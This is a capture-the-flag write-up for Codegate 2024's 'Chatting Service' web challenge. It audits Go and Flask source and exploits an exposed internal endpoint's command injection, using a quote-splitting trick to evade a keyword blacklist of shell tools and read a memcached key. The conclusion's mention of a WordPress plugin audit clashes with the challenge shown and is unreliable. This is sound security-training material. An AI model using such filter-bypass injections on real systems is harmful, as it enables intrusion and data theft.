# Chatting Service

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 82 solves / 250 points
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Chat service soft-launch. I feel there might be some issues with the logic.  
Could you take a look?  
  
[http://13.124.148.178:7777/](http://13.124.148.178:7777/)  
[http://3.36.67.87:7777](http://3.36.67.87:7777)  
[http://3.36.61.5:7777](http://3.36.61.5:7777)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602182618.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602182515.png)

In here, we can see that we'll need to be authenticated in order to use the web application.

Let's first click the "Signup" link to create a new account!

**Sign up page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602182730.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602182746.png)

When we clicked the "Register" button, it'll send a POST request to `/signup` with parameter `username` and `password`. After that, the web server respond to us with 2 new cookies, which are **`UserName` and `Session`**, as well as redirected us to the index page (`/`).

Now, let's sign in to our newly created account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602182958.png)

Upon logging in, we're directed to the `/chat_entrace` page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602183102.png)

Meanwhile, this page sent 2 HTTP requests to `/api/loadMessage` and `/api/reload`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602183205.png)

Hmm... Looks like we create a new chatting room by clicking the "Add a Chatting Room" button?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602183256.png)

And able to chat with other users?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602183400.png)

Uhh... There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/web/Chatting-Service/for_user.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service)-[2024.06.02|18:35:14(HKT)]
└> file for_user.zip                                                                            
ufor_user.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service)-[2024.06.02|18:35:18(HKT)]
└> unzip for_user.zip 
Archive:  for_user.zip
   creating: Flask/
   creating: Go/
   creating: Memcache/
   creating: Mysql/
  inflating: docker-compose.yml      
   creating: Flask/env/
   creating: Flask/src/
  inflating: Flask/Dockerfile        
  inflating: Flask/entrypoint.sh     
  inflating: Flask/env/memcached.conf  
   creating: Flask/src/templates/
  inflating: Flask/src/requirements.txt  
  inflating: Flask/src/app.py        
  inflating: Flask/src/terminal      
  inflating: Flask/src/terminal.c    
  inflating: Flask/src/templates/main.html  
  inflating: Flask/src/templates/undefinedcolumn.html  
  inflating: Flask/src/templates/login.html  
   creating: Go/env/
   creating: Go/src/
  inflating: Go/Dockerfile           
  inflating: Go/env/local_export.sh  
   creating: Go/src/codegate.module/
   creating: Go/src/github.com/
   creating: Go/src/codegate.module/reg/
   creating: Go/src/codegate.module/router/
   creating: Go/src/codegate.module/structure/
   creating: Go/src/codegate.module/template/
  inflating: Go/src/codegate.module/go.sum  
  inflating: Go/src/codegate.module/main.go  
  inflating: Go/src/codegate.module/go.mod  
  inflating: Go/src/codegate.module/structure/structure.go  
  inflating: Go/src/codegate.module/template/chat.html  
  inflating: Go/src/codegate.module/template/404.html  
  inflating: Go/src/codegate.module/template/hidden.html  
  inflating: Go/src/codegate.module/template/main.html  
  inflating: Go/src/codegate.module/template/signup.html  
  inflating: Go/src/codegate.module/template/main.css  
  inflating: Go/src/codegate.module/reg/manage_tables.go  
  inflating: Go/src/codegate.module/reg/create_tables.go  
  inflating: Go/src/codegate.module/router/router.go  
[...]
  inflating: Memcache/Dockerfile     
   creating: Mysql/src/
  inflating: Mysql/Dockerfile        
  inflating: Mysql/src/my.cnf        
```

After reading the source code for a little bit, we can have the following findings:

- The **Golang** web application is the **external** web application
- The **Flask** web application is the **internal** web application

Upon reviewing the Golang web application, I couldn't find any vulnerabilities, including logic issues. Although there's a hidden API endpoint, it's just a rabbit hole.

The Flask web application however, has some misconfiguration and vulnerabilities.

Let's dive into it!

Right off the bat, although the Flask web application (`Flask/src/app.py`) should be an internal web application, the developer accidentally **configured the web application to be hosted on all network interfaces**:

```python
[...]
if __name__ == '__main__':
    [...]
    app.run(host='0.0.0.0',debug=True,port=5000)
```

As you can see, **the IP address `0.0.0.0` is to bind to all network interfaces**, which means we should be able to reach the Flask web application via **port `5000`**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602185201.png)

Now, where's the flag?

**In here, we can see that the flag was being stored in the memcached database's key `flag`:** 
```python
from pymemcache.client.base import Client
[...]
client = Client(memcache_ip)
[...]
try:       
    client.set("flag","codegate2024{##CENSORED##}")
except Exception as e:
    print(f'memcache ==>  {e}')
[...]
```

With that said, we need to somehow **get the key `flag`'s value from the memcached database**.

In the Flask web application, there's a **`send_command` function**:

```python
import socket
[...]
SOCKET_PATH = './codegate2024.sock'
[...]
def send_command(command):
    try:
        print(f'will be send data : {command}')
        client_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client_socket.settimeout(5)
        
        client_socket.connect(SOCKET_PATH)
        client_socket.sendall(command.encode())
        
        response = client_socket.recv(1024).decode()
        return response
    except socket.timeout:
        return "Invalid Command"
    except Exception as e:
        print(e)
        return str(e)
[...]
```

Hmm... Looks like **the application can send commands to the `codegate2024.sock` socket connection**.

But how can we use that function? By tracing it back, function `send_command` was used by **function `internalDaemonService`**:

```python
[...]
def internalDaemonService(command):
    if command.startswith("admin://"):
        msg = AdminMessage(message=f'{command}')
        try:
            mysql_session.add(msg)
            mysql_session.commit()
        except Exception as e:
            print(e)
        finally:
            mysql_session.close()
        
        commandline = "cd /tmp &&"
        tmp = command.split("admin://")[1]
        commandline += tmp
        client.set(f'msg', f'{tmp}')

        filtered = ["memccat", "memcstat", "memcdump", "nc", "bash", "/bin", "/sh", "export", "env", "socket", "connect", "open", "set", "membash", "delete", "flush_all", "stats", "which" , "python", "perl", "rm", "mkdir", ".", "/"]

        for _filter in filtered:
            if _filter in tmp.lower():
                print(f'filter data : {_filter}')
                return "FILTER MESSAGE DETECTED"
        
        try:
            response = send_command(commandline)
            return response
        except Exception as e:
            return str(e)
    
    else:
        msg = Message(message=f'{command}')
        try:
            mysql_session.add(msg)
            mysql_session.commit()
        except Exception as e:
            print(e)
        finally:
            mysql_session.close()
        return f"The Message is already saved on DB : {command}"
[...]
```

As you can see, this function takes a `command` argument!

**If the `command` starts with `admin://`, it'll construct the following OS command:**
```bash
# admin://whoami
cd /tmp &&whoami
```

**Then, it'll check the constructed command against this blacklist:**
```python
filtered = ["memccat", "memcstat", "memcdump", "nc", "bash", "/bin", "/sh", "export", "env", "socket", "connect", "open", "set", "membash", "delete", "flush_all", "stats", "which" , "python", "perl", "rm", "mkdir", ".", "/"]
```

If the constructed command has the above blacklisted word, it'll return `FILTER MESSAGE DETECTED`. Otherwise, **the function will parse the constructed command to function `send_command`**.

Again, tracing it back, function `internalDaemonService` was used by **function `isValidateSession`**:

```python
[...]
import psycopg2
[...]
try:
    conn = psycopg2.connect(
                                database=os.environ.get('DB_NAME'),
                                user=os.environ.get('DB_USER'),
                                password=os.environ.get('DB_PASSWORD'),
                                host=os.environ.get('DB_HOST'),
                                port=os.environ.get('DB_PORT')
                        )
except Exception as e:
    print(e)
[...]
def isValidateSession(username, session, command):
    cur = conn.cursor()
    query = f"SELECT session, session_enable FROM register where username='{username}' and session='{session}'"
    print(f'query : {query}')
    
    if username == None or session == None:
        return "NONE"

    if "'" in username or "'" in session:
        return "DO NOT TRY SQL INJECTION"
    
    try:
        cur.execute(query)
        result = cur.fetchone()
        
        if result:
            internal_session, session_enable = result
            if internal_session == session:
                return internalDaemonService(command)
            
        else:
            return "Please recheck username or Session"
        
    except Exception as e:
        print(f'exception: {e}')
    
    return "NONE"
[...]
```

In here, we can see that this function executes a **raw SQL query** to **get the result of a user's session** based on the provided `username` and `session` arguments.

**If the provided `session` is matched to the table `register`**, it'll call function `internalDaemonService` with the provided `command` argument.

In here, we could try to perform SQL injection, **but the `'` filter seems like it's impossible to bypass?**

Now, again, tracing it back, function `isValidateSession` was used by the **Flask route `/login`**!

```python
[...]
@app.route("/login", methods=["GET", "POST"])
def debugLoginPage():
    response = make_response()
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add('Access-Control-Allow-Headers', "*")
    response.headers.add('Access-Control-Allow-Methods', "*")
    if request.method == "GET":
        return "CANNOT LOGIN YOURSELF"
    if request.method == "POST":
        try:
            web_username = request.form.get('username') 
            web_session = request.form.get('session')
            command = request.form.get('command')
            response_result = isValidateSession(web_username,web_session, command)
        except Exception as e:
            print(e)
        return render_template('main.html', response_result=response_result)
[...]
```

In here, we can **send a POST request to `/login` with form parameter `username`, `session`, and `command`** in order to call function `isValidateSession`!

But wait, how can we get the `username` and `session` value?

By looking at the **Golang** web application, **a new user record is inserted when we signed up at the `/signup` route**:

**`Go/src/codegate.module/router/router.go`:**
```go
[...]
import (
    [...]
    /* custom */
    "codegate.module/reg"
    "codegate.module/structure"
)
[...]
func Init(db *sql.DB) {
    [...]
    r.HandleFunc("/signup", func(w http.ResponseWriter, r *http.Request) {
        SignupHandler(w, r, db)
    }).Schemes("http")
    [...]
}
[...]
func SignupHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    [...]
    if r.Method == "GET" {
        [...]
    } else if r.Method == "POST" {
        [...]
        username := r.FormValue("username")
        password := r.FormValue("password")
        [...]
        ret := reg.InsertUser(db, data)
        [...]
        if ret == 1 {
            uuid, _ := uuid.NewRandom()
            uuidString := uuid.String()
            expiration := time.Now().Add(365 * 24 * time.Hour)
            cookie := http.Cookie{Name: "UserName", Value: username, Expires: expiration, Path: "/"}
            cookie2 := http.Cookie{Name: "Session", Value: uuidString, Expires: expiration, Path: "/"}
            [...]
            http.SetCookie(w, &cookie)
            http.SetCookie(w, &cookie2)

            http.Redirect(w, r, "/", http.StatusSeeOther)
            return
        }
    }
}
```

**`Go/src/codegate.module/reg/manage_tables.go`:**
```go
[...]
func InsertUser(db *sql.DB, data structure.User) int {
    [...]
    insertTableQuery := `
        INSERT INTO register(username, password) 
        VALUES ($1, $2)
    `
    [...]
    _, err = db.Exec(insertTableQuery, data.Id, data.Password)
    [...]
}
[...]
```

In the above functions, when we send a **POST request to `/signup`** with form parameter `username` and `password`, it'll **insert a new user record into table `register`**. Also, **it generates a UUIDv4 string as our session cookie**.

Hmm... Wait a minute, **our session cookie is not being inserted into table `register`**??

Well, **it does when we login at route `/`.**

**`Go/src/codegate.module/router/router.go`:**
```go
[...]
import (
    [...]
    /* custom */
    "codegate.module/reg"
    "codegate.module/structure"
)
[...]
func Init(db *sql.DB) {
    [...]
    r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        MainHandler(w, r, db)
    }).Schemes("http")
    [...]
}
[...]
func MainHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    [...]
    if r.Method == "GET" {
        [...]
    } else if r.Method == "POST" { // Sign in
        [...]
        username = r.FormValue("username")
        password := r.FormValue("password")
        [...]
        ret = reg.IsUser(db, data)
        [...]
        if ret == 1 {
            [...]
            comp_session, err := r.Cookie("Session")
            [...]
            if err != nil {
                [...]
            } else {
                [...]
                data.Session = comp_session.Value
                ret = reg.UpdateUser(w, r, db, data)
                [...]
            }
        }
    }
}
```

**`Go/src/codegate.module/reg/manage_tables.go`:**
```go
[...]
func UpdateUser(w http.ResponseWriter, r *http.Request, db *sql.DB, data structure.User) int {
    [...]
    updateQuery := `
        UPDATE register 
        SET session = $1, session_enable=1 
        WHERE username = $2 and password = $3
    `
    [...]
    uuid, _ := uuid.NewRandom()
    uuidString := uuid.String()
    
    comp_session, err := r.Cookie("Session")
    [...]
    if comp_session.Value != uuidString {
        flag = 0
    }

    if flag == 0 || flag == -1 {
        debug_cookie := http.Cookie{
            Name:     "UserName",
            HttpOnly: true,
            Value:    data.Id,
        }
        debug_cookie2 := http.Cookie{
            Name:     "Session",
            HttpOnly: true,
            Value:    uuidString,
        }
        w.Header().Set("Set-Cookie", debug_cookie.String())
        w.Header().Add("Set-Cookie", debug_cookie2.String())

        data.Session = uuidString
        
        stmt2, err := db.Prepare(updateQuery)
        [...]
        _, err = stmt2.Exec(data.Session, data.Id, data.Password)
        [...]
    }
    [...]
}
```

When we send a POST request to `/` with parameter `username` and `password`, it'll first check our cookie `session`'s value is matched to a randomly generated session cookie. If it's not matched, it'll **insert a new session cookie's value to our user record at table `register`** and set a new session cookie.

So, basically **when we logged in, it'll generate a new session cookie and insert it into table `register`**.

## Exploitation

Putting everything back together, we can get the flag via:

1. Register a new account at the **Golang** web application
2. Login and get the new session cookie's value at the **Golang** web application
3. Login to the exposed "internal" **Flask** web application with a `command` parameter that gets the flag

Since we already done the first step, we can now first **login to our new account and jot down the new session cookie's value**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602194938.png)

In my case, the new session cookie's value is `1798d735-438c-4513-8685-014f4df3f187`.

Then, Login to the exposed "internal" **Flask** web application:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Codegate-CTF-2024-Preliminary/images/Pasted%20image%2020240602195047.png)

> Note: Normally, the Flask web application respond us with the `whoami` command output. However, in my case, the challenge instance's socket connection seems to be down.

Now, how can we get the flag from the `flag` key in the memcached database??

By researching for a little bit about memcached, we can find **[this GitBook](https://chinnidiwakar.gitbook.io/githubimport/pentesting/11211-memcache#manual2)**:

```bash
sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
```

In the above commands, we can **use `memccat` to get the `key` flag via this command**:

```bash
memccat --servers=127.0.0.1 flag
```

**However, we can't just send the `command` parameter with this value: `admin://memccat --servers=127.0.0.1 flag` because of the blacklist filter:**
```python
filtered = ["memccat", "memcstat", "memcdump", "nc", "bash", "/bin", "/sh", "export", "env", "socket", "connect", "open", "set", "membash", "delete", "flush_all", "stats", "which" , "python", "perl", "rm", "mkdir", ".", "/"]
```

As you can see, the word `memccat` and character `.` is included in the blacklist. Luckily, it's very easy to bypass it.

To bypass the blacklist filter, we can **use quotes to concatenate the word `memccat`**: (From [HackTricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-paths-and-forbidden-words)):

```bash
admin://"m"e"m"c"c"a"t --servers=127.0.0.1 flag
```

Then, the character `.`, we can just **replace it with `localhost`**, which points to `127.0.0.1`!

**Hence, here's the final payload:**
```bash
admin://"m"e"m"c"c"a"t --servers=localhost flag
```

By sending this payload, we should be able to get the flag!

- **Flag: `codegate2024{Important_DATA_DO_NOT_SAVE_IN_MEMCACHE}`**

## Conclusion

What we've learned:

1. WordPress plugin source code audit